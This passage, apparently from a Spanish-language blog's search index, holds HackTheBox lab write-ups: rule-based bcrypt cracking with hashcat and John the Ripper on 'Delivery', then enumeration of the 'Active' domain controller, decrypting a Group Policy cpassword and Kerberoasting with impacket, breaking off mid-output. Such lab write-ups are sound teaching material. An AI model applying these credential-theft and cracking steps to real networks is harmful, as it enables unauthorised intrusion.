hash‚Ä¶ Haremos el ataque basado en reglas usando hashcat y JohnTheRipper: HashCat - Rule Based Attack: Empecemos por hashcat.  Estudio de varias reglas, viendo la velocidad y eficacia de cada una en hashcatLas reglas est√°n en el directorio /usr/share/hashcat/rules/: „Çù ls /usr/share/hashcat/rules/best64. rule   generated2. rule Incisive-leetspeak. rule   OneRuleToRuleThemAll. rule T0XlC-insert_00-99_1950-2050_toprules_0_F. rule T0XlCv1. rule  toggles4. rulecombinator. rule generated. rule  InsidePro-HashManager. rule  oscommerce. rule      T0XlC-insert_space_and_special_0_F. rule     toggles1. rule toggles5. ruled3ad0ne. rule   hob064. rule   InsidePro-PasswordsPro. rule rockyou-30000. rule     T0XlC-insert_top_100_passwords_1_G. rule     toggles2. rule unix-ninja-leetspeak. ruledive. rule    hybrid      leetspeak. rule        specific. rule       T0XlC. rule                   toggles3. ruleBien, siguiendo el estudio referenciado antes, usaremos la regla InsidePro-PasswordsPro. rule:  Ac√° podemos entender el contenido de las reglas. Entonces, tenemos la regla y el hash, creamos un archivo llamado dic. txt que tenga la cadena PleaseSubscribe!, para as√≠ contar con todos los elementos para empezar a jugar‚Ä¶ Teniendo todo ejecutamos: „Çù hashcat -m 3200 -r /usr/share/hashcat/rules/InsidePro-HashManager. rule hash_root_mattermost dic. txt -o cracked. txtDonde:  -m: Tiene el tipo de hash a crackear, en este caso 3200:bcrypt.  -r: Tiene la regla a usar.  Pasamos el archivo que contiene el hash.  Pasamos el diccionario, el cual contiene la cadena PleaseSubscribe!.  -o: Le indicamos que si crackea el hash, nos guarde el resultado en el archivo llamado cracked. txt. Despues de un rato obtenemos respuesta: „Çù cat cracked. txt $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O. 1STWb4. 4ScG. anuu7v0EFJwgjjO:PleaseSubscribe!21Con una cadena en texto plano: PleaseSubscribe!21. La cual ser√≠a la contrase√±a del usuario root del servicio Mattermost, peeeero intentando rehusarla contra la m√°quina y el usuario root, obtenemos: Una sesi√≥n como √©l :))))))))) Ahora hagamos el mismo procedimiento pero con John The Ripper: John The Ripper - Rule Based Attack: Con john encontramos un lindo recurso con el que nos guiaremos:  Comprehensive Guide to John the Ripper - Rule-based attack. En esta herramienta debemos actualizar (si quieren crear su propia regla) un archivo, en mi caso /etc/john/john. conf y agregarle lo que quieran, un punto superinteresante es que las reglas usadas en hashcat y john pueden ser las mismas, esto facilita mucho el aprendizaje. Adem√°s podemos ver como act√∫an las reglas en una cadena, esto est√° genial como aprendizaje de cada regla‚Ä¶ Creo una regla llamada Lanz: „Çù cat /etc/john/john. conf# Yo lo puse al final del archivo :P. . . [List. Rules:Lanz]T0T1T2T0T1T1T2T0T2T0T1T2$1$2$2$3$2$1$1$2. . . # Ac√° puedes agregar infinitas reglas seg√∫n lo que quieras probar. . . . . . En este caso le pasamos la regla T (Cambia entre may√∫scula a min√∫scula y al rev√©s :P) y un numero, donde ese numero es la posici√≥n donde queremos que se efect√∫e la regla (:Y le pasamos la regla $, que agrega al final algo, donde s√© algo es lo que esta despues de dicho s√≠mbolo, por ejemplo $1, agregara al final de la cadena el n√∫mero 1, veamos la regla en ejecuci√≥n: „Çù john --rules=Lanz --wordlist=dic. txt --stdoutUsing default input encoding: UTF-8pleaseSubscribe!PLeaseSubscribe!PlEaseSubscribe!pLeaseSubscribe!PLEaseSubscribe!plEaseSubscribe!pLEaseSubscribe!PleaseSubscribe!1PleaseSubscribe!2PleaseSubscribe!23PleaseSubscribe!21PleaseSubscribe!1212p 0:00:00:00 100,00% (2021-05-17 25:25) 85. 71p/s PleaseSubscribe!12Le pasamos la regla que creamos anteriormente (--rules), el diccionario (--wordlist) y que nos muestre por pantalla lo que probar√≠a (--stdout). Perfecto, vemos como se va modificando nuestro diccionario seg√∫n la regla (eso esta buenaso), ahora probemos contra el hash: „Çù john --rules=Lanz --wordlist=dic. txt --format=bcrypt hash_root_mattermost Using default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesPress 'q' or Ctrl-C to abort, almost any other key for statusPleaseSubscribe!21 (?)1g 0:00:00:00 DONE (2021-05-17 25:25) 3. 571g/s 42. 85p/s 42. 85c/s 42. 85C/s PleaseSubscribe!23. . PleaseSubscribe!12Use the  --show  option to display all of the cracked passwords reliablySession completed„Çù john --show hash_root_mattermost ?:PleaseSubscribe!211 password hash cracked, 0 leftY si, tambi√©n hace la tarea de jugar con las reglas para finalmente darnos la cadena PleaseSubscribe!21 como v√°lida ante el hash :) Y por consiguiente volvernos a conectar como root y leer las flags :)  Pa leer: Otro recurso que habla de las reglas con respecto a john. ‚Ä¶ Como conclusi√≥n ippsec nos deja una nota: root@Delivery:~# cat note. txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times.  The inspiration for the box is here: - https://medium. com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don't forget to subscribe to all the security streamers out there. - ippsec‚Ä¶ Me gusto bastante el ataque inicial una vez entendido, brutalidad eh! Como de algo tan peque√±o explotan cosas gigantes ufff. El tema de las reglas es algo que puede ser muuuuy peligroso, me encanta como trabajan y modifican la data, que loco (: Weno, hemos llegado hasta ac√° pero nos queda mucho por explorar, pero tambi√©n nos queda como siempre seguir rompiendo de todooooo! Gracias por leer &lt;3 "
    }, {
    "id": 49,
    "url": "http://localhost:4000/htb/active",
    "title": "HackTheBox - Active",
    "body": "2021/05/16 - M√°quina Windows nivel medio, de cabeza contra un Domain Controller, jugaremos mucho con SMB y sus carpetas compartidas, movimientos SYStematicos y VOLtaicos e. e, bastante crackeo de contrase√±as y obtenci√≥n de tickets para jugar con los perritos (Kerberos).  TL;DR (Spanish writeup): Creada por: eks &amp; mrb3n. LISTOOOOOOOOOOOOOOOOOOOOOO, nos enfrentaremos a un Domain Controller con mucho jugueteo. Inicialmente tendremos una carpeta compartida en la cual tendremos un archivo que se genera gracias al SYSVOL llamado Groups. xml, dentro habr√° unas credenciales, pero la contrase√±a estar√° cifrada, enumerando encontraremos la manera de crackearla, no nos servir√°n para entablar shells ni nada, pero podremos usarlas contra el servicio SMB de nuevo y tener acceso a nuevas carpetas compartidas, una de ellas es Users, ah√≠ encontraremos la flag user. txt con respecto al usuario SVC_TGS. Jugando con el servicio Kerberos lograremos obtener un Ticket Granting Service del usuario que est√° ejecutando el servicio SMB (Administrator), debemos crackearlo y apoy√°ndonos de herramientas como wmiexec o psexec lograremos una terminal como Administrator en el DC :) Clasificaci√≥n de la m√°quina: Tiene vulnerabilidades m√°s o menos conocidas y tirando a reales.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ ¬°Entonces, hag√°moslo real!  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Vamos a empezar con nuestro escaneo de puertos: „Çù nmap -p- --open -v 10. 10. 10. 100 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   „Çù cat initScan# Nmap 7. 80 scan initiated Wed May 12 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 100# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 100 () Status: UpHost: 10. 10. 10. 100 () Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5722/open/tcp//msdfsr///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49152/open/tcp//unknown///, 49153/open/tcp//unknown///, 49154/open/tcp//unknown///, 49155/open/tcp//unknown///, 49157/open/tcp//unknown///, 49158/open/tcp//unknown///, 49169/open/tcp//unknown///, 49171/open/tcp//unknown///, 49180/open/tcp/////# Nmap done at Wed May 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 103. 03 seconds Required ports to communicate with Domain controller. Opa, un mont√≥n de puertos, list√©moslos:       Puerto   Descripci√≥n         53   DNS       88   Kerberos       135   RPC       139   SMB       389   LDAP       445   SMB       464   Kerberos Password Change       593   RPC web       636   LDAP SSL       3268   Global LDAP       3269   Global LDAP SSL       5722   Distributed File System Replication       9389   Active Directory Web Services (ADWS)       47001   WinRM       49152,49153,49154,49155,49157,49158,49169,49171,49180   Desconocidos   Ahora hagamos un escaneo de scripts y versiones, as√≠ profundizamos en cada puerto: (Con la funci√≥n de s4vitar extraemos los puertos f√°cilmente directo a la clipboard „Çù extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 100  [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180[*] Ports copied to clipboard)** „Çù nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 -sC -sV 10. 10. 10. 100 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   „Çù cat portScan# Nmap 7. 80 scan initiated Wed May 12 25:25:25 2021 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 -sC -sV -oN portScan 10. 10. 10. 100Nmap scan report for 10. 10. 10. 100Host is up (0. 40s latency). PORT   STATE SERVICE    VERSION53/tcp  open  domain    Microsoft DNS 6. 1. 7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_ bind. version: Microsoft DNS 6. 1. 7601 (1DB15D39)88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-05-12 17:15:31Z)135/tcp  open  msrpc     Microsoft Windows RPC139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn389/tcp  open  ldap     Microsoft Windows Active Directory LDAP (Domain: active. htb, Site: Default-First-Site-Name)445/tcp  open  microsoft-ds?464/tcp  open  tcpwrapped593/tcp  open  ncacn_http  Microsoft Windows RPC over HTTP 1. 0636/tcp  open  tcpwrapped3268/tcp open  ldap     Microsoft Windows Active Directory LDAP (Domain: active. htb, Site: Default-First-Site-Name)3269/tcp open  tcpwrapped5722/tcp open  msrpc     Microsoft Windows RPC9389/tcp open  mc-nmf    . NET Message Framing47001/tcp open  http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found49152/tcp open  msrpc     Microsoft Windows RPC49153/tcp open  msrpc     Microsoft Windows RPC49154/tcp open  msrpc     Microsoft Windows RPC49155/tcp open  msrpc     Microsoft Windows RPC49157/tcp open  ncacn_http  Microsoft Windows RPC over HTTP 1. 049158/tcp open  msrpc     Microsoft Windows RPC49169/tcp open  msrpc     Microsoft Windows RPC49171/tcp open  msrpc     Microsoft Windows RPC49180/tcp closed unknownService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7m29s| smb2-security-mode: |  2. 02: |_  Message signing enabled and required| smb2-time: |  date: 2021-05-12T17:16:29|_ start_date: 2021-05-12T17:01:09Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed May 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 198. 07 secondsDe las versiones simplemente obtenemos info del servicio DNS:       Puerto   Servicio   Versi√≥n         53   DNS   6. 1. 7601   Del escaneo podemos destacar:  Un dominio: active. htb.  Probablemente sea un windows_server_2008. Pues a jugar y ver por donde logramos vulnerar lo que parece ser un directorio activo (:  Learn basics of active directory.  AD: Sistema de Windows que gestiona el inicio de sesi√≥n de los usuarios dentro de la red de una empresa, o ‚Äúdominio‚Äù. As√≠ se determina a qu√© recursos puede acceder esa persona (como archivos, carpetas, impresoras, otros equipos‚Ä¶) en la empresa. Info sobre LDAP y AD. ‚Ä¶ Puerto 135 - RPC ‚åñ: Podemos ver m√°s info del controlador de dominio mediante la herramienta rpcclient, intentemos ingresar con una null session, ya que no tenemos credenciales: „Çù rpcclient 10. 10. 10. 100 -U '' -Nrpcclient $&gt; enumdomusersCould not initialise samr. Error was NT_STATUS_ACCESS_DENIEDPodemos ingresar, pero no logramos interactuar con sus funciones, as√≠ que F :( ‚Ä¶ Puertos 389, 636, 3268, 3269 - LDAP ‚åñ:  Lightweight Directory Access Protocol (Protocolo Ligero de Acceso a Directorios), es un mecanismo importante en el inicio de sesi√≥n de los ordenadores en red, sobre todo dentro de las empresas. Info sobre LDAP. Siguiendo esta gu√≠a podemos enumerar el servicio LDAP con la herramienta ldapsearch: „Çù ldapsearch -h 10. 10. 10. 100 -x -s base namingcontexts. . . dn:namingContexts: DC=active,DC=htbnamingContexts: CN=Configuration,DC=active,DC=htbnamingContexts: CN=Schema,CN=Configuration,DC=active,DC=htbnamingContexts: DC=DomainDnsZones,DC=active,DC=htbnamingContexts: DC=ForestDnsZones,DC=active,DC=htb. . . Donde -x le indica que haga un null session y -s le pasa el objetivo, en nuestro caso que nos muestre los namingContexts definidos por el servidor‚Ä¶ Obtenemos info que ya ten√≠amos (DC=active. htb), pero ahora sabemos como est√° dividido y su estructura, nos sirve para seguir buscando con ldapsearch, ahora pas√©mosle el DC del cual queremos m√°s info: „Çù ldapsearch -h 10. 10. 10. 100 -x -b  DC=active,DC=htb . . . result: 1 Operations errortext: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera tion a successful bind must be completed on the connection. , data 0, v1db1. . . Pero al parecer no podemos hacer nada con el null session :( Veamos el servicio SMB:  Pa leer: Diferencias entre los puertos LDAP y LDAP SSL. ‚Ä¶ Puerto 139, 445 - SMB ‚åñ:  Agreguemos el dominio active. htb al archivo /etc/hosts, por si algo u. u Samba en pocas palabras nos permite intercambiar archivos en una red.  Server Message Block (SMB). Veamos que sistema aparentemente soporta el DC: „Çù crackmapexec smb 10. 10. 10. 100SMB     10. 10. 10. 100  445  DC        [*] Windows 6. 1 Build 7601 x64 (name:DC) (domain:active. htb) (signing:True) (SMBv1:False)Jmmm, Windows 6. 1? Pa tener en cuenta, veamos a que recursos tenemos acceso mediante un null session, para esto podemos usar smbmap: „Çù smbmap -H 10. 10. 10. 100 -u '' -p ''[+] IP: 10. 10. 10. 100:445    Name: active. htb                        Disk                          Permissions   Comment    ----                          -----------   -------    ADMIN$                         NO ACCESS    Remote Admin    C$                           NO ACCESS    Default share    IPC$                          NO ACCESS    Remote IPC    NETLOGON                        NO ACCESS    Logon server share     Replication                       READ ONLY    SYSVOL                         NO ACCESS    Logon server share     Users                          NO ACCESSOpa, vemos varios recursos, pero solo tenemos acceso de lectura a uno llamado Replication, ahora aprovechemos el uso de smbclient para entrar en ese directorio compartido: „Çù smbclient //10. 10. 10. 100/Replication -U '' -NTry  help  to get a list of possible commands. smb: \&gt; dir .                  D    0 Sat Jul 21 05:37:44 2018 . .                  D    0 Sat Jul 21 05:37:44 2018 active. htb             D    0 Sat Jul 21 05:37:44 2018        10459647 blocks of size 4096. 5728737 blocks availablesmb: \&gt; cd active. htbsmb: \active. htb\&gt; dir .                  D    0 Sat Jul 21 05:37:44 2018 . .                  D    0 Sat Jul 21 05:37:44 2018 DfsrPrivate            DHS    0 Sat Jul 21 05:37:44 2018 Policies              D    0 Sat Jul 21 05:37:44 2018 scripts               D    0 Wed Jul 18 13:48:57 2018        10459647 blocks of size 4096. 5728737 blocks availablesmb: \active. htb\&gt; Bien, al parecer son varios recursos, para evitar ir de carpeta en carpeta, podemos descargar los archivos a nuestra m√°quina y jugar de la manera que queramos, usaremos smbget para hacer esto: (Tambi√©n podr√≠amos hacer una montura del directorio, pero no me gusta, a veces va suuuuuuuuuper lento) „Çù smbget -R smb://10. 10. 10. 100/Replication -U ''Password for [] connecting to //Replication/10. 10. 10. 100: Using workgroup WORKGROUP, guest usersmb://10. 10. 10. 100/Replication/active. htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT. INIsmb://10. 10. 10. 100/Replication/active. htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE. INIsmb://10. 10. 10. 100/Replication/active. htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl. infsmb://10. 10. 10. 100/Replication/active. htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups. xmlsmb://10. 10. 10. 100/Replication/active. htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry. polsmb://10. 10. 10. 100/Replication/active. htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT. INIsmb://10. 10. 10. 100/Replication/active. htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl. infDownloaded 8,11kB in 31 seconds(Cuando nos pida la contrase√±a debemos ponerle un espacio) Listos, tenemos todo el directorio Replication, ve√°moslo: „Çù tree. ‚îú‚îÄ‚îÄ DfsrPrivate‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ConflictAndDeleted‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Deleted‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Installing‚îú‚îÄ‚îÄ Policies‚îÇ¬†¬† ‚îú‚îÄ‚îÄ {31B2F340-016D-11D2-945F-00C04FB984F9}‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ GPT. INI‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Group Policy‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ GPE. INI‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ MACHINE‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Microsoft‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Windows NT‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬†   ‚îî‚îÄ‚îÄ SecEdit‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ GptTmpl. inf‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Preferences‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Groups‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬†   ‚îî‚îÄ‚îÄ Groups. xml‚îÇ¬†¬† ‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Registry. pol‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ USER‚îÇ¬†¬† ‚îî‚îÄ‚îÄ {6AC1786C-016F-11D2-945F-00C04fB984F9}‚îÇ¬†¬†   ‚îú‚îÄ‚îÄ GPT. INI‚îÇ¬†¬†   ‚îú‚îÄ‚îÄ MACHINE‚îÇ¬†¬†   ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ Microsoft‚îÇ¬†¬†   ‚îÇ¬†¬†   ‚îî‚îÄ‚îÄ Windows NT‚îÇ¬†¬†   ‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ SecEdit‚îÇ¬†¬†   ‚îÇ¬†¬†       ‚îî‚îÄ‚îÄ GptTmpl. inf‚îÇ¬†¬†   ‚îî‚îÄ‚îÄ USER‚îî‚îÄ‚îÄ scripts21 directories, 7 files‚Ä¶ Explotaci√≥n #: Entre tantos directorios podemos detectar algunos archivos, pero despues de enumerar cada uno, vemos algo curioso en el objeto Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups. xml: „Çù cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups. xml&lt;?xml version= 1. 0  encoding= utf-8 ?&gt;&lt;Groups clsid= {3125E937-EB16-4b4c-9934-544FC6D24D26} &gt;  &lt;User clsid= {DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}  name= active. htb\SVC_TGS  image= 2  changed= 2018-07-18 20:46:06  uid= {EF57DA28-5F69-4530-A59E-AAB58578219D} &gt;    &lt;Properties action= U  newName=   fullName=   description=   cpassword= edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ  changeLogon= 0  noChange= 1  neverExpires= 1  acctDisabled= 0  userName= active. htb\SVC_TGS /&gt;  &lt;/User&gt;&lt;/Groups&gt;üò± Algunas cosas para destacar: * name= active. htb\SVC_TGS , con lo que parece ser un usuario del dominio `active. htb`. * cpassword= edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ . Una contrase√±a, ¬øno? e. eBien, pues buscando info sobre el campo cpassword en la web, encontramos estos dos posts:  Active Directory Security - TAG: Cpassword. Hacen referencia a Attack Techniques to go from Domain User to Domain Admin, y uno de ellos habla del archivo Groups. xml, que casi siempre va a contener credenciales de un usuario del dominio‚Ä¶ Siguiendo el post nos indica que ese archivo (y otros) se generan gracias al SYSVOL:  SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. SYSVOL contains logon scripts, group policy data, and other domain-wide data which needs to be available anywhere there is a Domain Controller. Passwords in SYSVOL. Tambi√©n nos indica que cuando se genera un GPP (Group Policy Preference) se asocia un archivo XML con informaci√≥n relevante (muy relevante):  When a new GPP is created, there‚Äôs an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted which should be good enough‚Ä¶ Peroooooooo:  Except at some point prior to 2012, Microsoft published the AES encryption key (shared secret) on MSDN which can be used to decrypt the password. Bingo! As√≠ que de alguna forma podemos desencriptar la contrase√±a‚Ä¶ Buscando herramientas para esto, encontramos gpprefdecrypt. py, a la cual simplemente debemos pasarle el contenido encriptado y obtendr√≠amos la contrase√±a en texto plano: „Çù wget https://raw. githubusercontent. com/reider-roque/pentest-tools/master/password-cracking/gpprefdecrypt/gpprefdecrypt. py„Çù python gpprefdecrypt. py Usage: python gpprefdecrypt. py CPASSWORD„Çù python gpprefdecrypt. py  edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18Opaaaaaaaaaa, tenemos una contrase√±a y al parecer es del usuario SVC_TGS, probemos con crackmapexec y veamos si son credenciales funcionales: # Contrase√±a correcta„Çù crackmapexec smb 10. 10. 10. 100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'SMB     10. 10. 10. 100  445  DC        [*] Windows 6. 1 Build 7601 x64 (name:DC) (domain:active. htb) (signing:True) (SMBv1:False)SMB     10. 10. 10. 100  445  DC        [+] active. htb\SVC_TGS:GPPstillStandingStrong2k18 # Validando que realmente sea correcta„Çù crackmapexec smb 10. 10. 10. 100 -u 'SVC_TGS' -p 'InvaliD4supuestam3nt3'SMB     10. 10. 10. 100  445  DC        [*] Windows 6. 1 Build 7601 x64 (name:DC) (domain:active. htb) (signing:True) (SMBv1:False)SMB     10. 10. 10. 100  445  DC        [-] active. htb\SVC_TGS:InvaliD4supuestam3nt3 STATUS_LOGON_FAILUREY s√≠, son v√°lidas contra el DC‚Ä¶ Prob√°ndolas contra el servicio WinRM mediante la herramienta evil-winrm no logramos acceso a una PowerShell :( Pero jugando de nuevo con smbmap y smbclient tenemos acceso a otras carpetas compartidas: „Çù smbmap -H 10. 10. 10. 100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'[+] IP: 10. 10. 10. 100:445    Name: active. htb                        Disk                          Permissions   Comment    ----                          -----------   -------    ADMIN$                         NO ACCESS    Remote Admin    C$                           NO ACCESS    Default share    IPC$                          NO ACCESS    Remote IPC    NETLOGON                        READ ONLY    Logon server share     Replication                       READ ONLY    SYSVOL                         READ ONLY    Logon server share     Users                          READ ONLYEntre los 4 directorios a los que tenemos acceso de lectura, uno de ellos se ve interesante, ¬øcu√°l? e. e Pues si, el directorio Users ta mir√°ndonos directamente a los ojos y desafiando nuestra habilidad de enumerarlo, as√≠ que juguemos con √©l :P „Çù smbclient //10. 10. 10. 100/Users -U 'SVC_TGS'Enter WORKGROUP\SVC_TGS's password: Try  help  to get a list of possible commands. smb: \&gt; dir .                  DR    0 Sat Jul 21 09:39:20 2018 . .                 DR    0 Sat Jul 21 09:39:20 2018 Administrator            D    0 Mon Jul 16 05:14:21 2018 All Users            DHSrn    0 Tue Jul 14 00:06:44 2009 Default              DHR    0 Tue Jul 14 01:38:21 2009 Default User          DHSrn    0 Tue Jul 14 00:06:44 2009 desktop. ini            AHS   174 Mon Jul 13 23:57:55 2009 Public               DR    0 Mon Jul 13 23:57:55 2009 SVC_TGS               D    0 Sat Jul 21 10:16:32 2018        10459647 blocks of size 4096. 5728465 blocks availablesmb: \&gt; De nuevo tenemos varios directorios, descarguemoslos, ahora hagamos uso del propio smbclient para esto: smb: \&gt; recurse ONsmb: \&gt; prompt OFFsmb: \&gt; mget *. . . . . . . . . smb: \&gt;Listos, entre los archivos, en la descarga nos damos cuenta de que tenemos uno llamado user. txt (la flag) (?), validemos, porque si tenemos la flag (y es v√°lida) entendemos que la carpeta Users est√° sincronizada en tiempo real: „Çù cat SVC_TGS/Desktop/user. txt 86d6. . . Ingres√°ndola como flag en Hack The Box nos damos cuenta de que es v√°lida, por lo tanto confirmamos lo antes dicho :P Jmmm, entonces nos queda ver como podemos obtener una terminal ya sea como el usuario SVC_TGS o directamente como Administrator, demos algunas vueltas para descubrir que hacer‚Ä¶ ‚Ä¶ Escalada de privilegios #: Podemos ver los usuarios del dominio con rpcclient apoy√°ndonos de las nuevas credenciales, pero tambi√©n con una herramienta del conjunto impacket llamada GetADUsers. py que nos muestra esa informaci√≥n: „Çù GetADUsers. py -all active. htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10. 10. 10. 100Impacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth Corporation[*] Querying 10. 10. 10. 100 for information about domain. Name         Email              PasswordLastSet   LastLogon      -------------------- ------------------------------ ------------------- -------------------Administrator                     2018-07-18 14:06:40. 351723 2021-01-21 11:07:03. 723783 Guest                         &lt;never&gt;       &lt;never&gt;       krbtgt                        2018-07-18 13:50:36. 972031 &lt;never&gt;       SVC_TGS                        2018-07-18 15:14:38. 402764 2021-05-12 23:47:48. 356719Hay 4 usuarios, pero activos constantemente solo 2, Administrator y SVC_TGS. ‚Ä¶ Despues de intentar interactuar con las carpetas compartidas a ver si pod√≠amos subir algo (no se pudo :P) y jugar con los dem√°s puertos a ver si alguno ten√≠a algo interesante, caemos en el servicio Kerberos. ‚Ä¶ Puerto 88 - Kerberos ‚åñ:  Kerberos es un sistema de autenticaci√≥n mutua, es decir, el cliente verifica y comprueba la identidad del servidor, mientras que el servidor acredita y verifica la identidad del cliente. Pentensting AD.  How does Kerberos works. Existen varios tipos de ataques que pueden ser llevados a cabo (o probados) ante un servidor kerberos, uno de ellos llamado Kerberoasting:  Hay un tipo de cuentas que son espec√≠ficas para la ejecuci√≥n de un servicio. Generalmente, este tipo de cuentas disfrutan de privilegios excesivos y muchas veces tambi√©n pertenecen al grupo de ‚ÄúAdministradores de Dominio‚Äù en los controladores de dominio. Kerberoasting. Por lo tanto hay cuentas ‚Äúnormales‚Äù que realmente est√°n siendo usadas para ejecutar tareas privilegiadas y por el fondo hablar√≠an como tal, cuentas privilegiadas :o  El objetivo del Kerberoasting es recolectar tickets TGS (Ticket Granting Service: ticket que se presenta ante un servicio para poder acceder a sus recursos) para servicios que se ejecutan en nombre de cuentas de usuario del AD, no cuentas del sistema. Attacking kerberos - Kerberoasting. Estos tickets pueden ser crackeados, pero claro, depende siempre de lo fuerte que sea la contrase√±a‚Ä¶  Pa leer: How to attack Kerberos. Podemos apoyarnos de una herramienta de impacket llamada GetUserSPNs. py que valida el trasfondo de una cuenta y extrae los tickets correspondientes:  Le pasamos el dominio/usuario:contrase√±a.  La direcci√≥n IP del DC.  Y con el par√°metro -requests le decimos que haga una petici√≥n para que devuelta nos muestre los tickets. A vel: „Çù GetUserSPNs. py active. htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10. 10. 10. 100 -requestImpacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth CorporationServicePrincipalName Name      MemberOf                         PasswordLastSet       LastLogon          Delegation-------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- 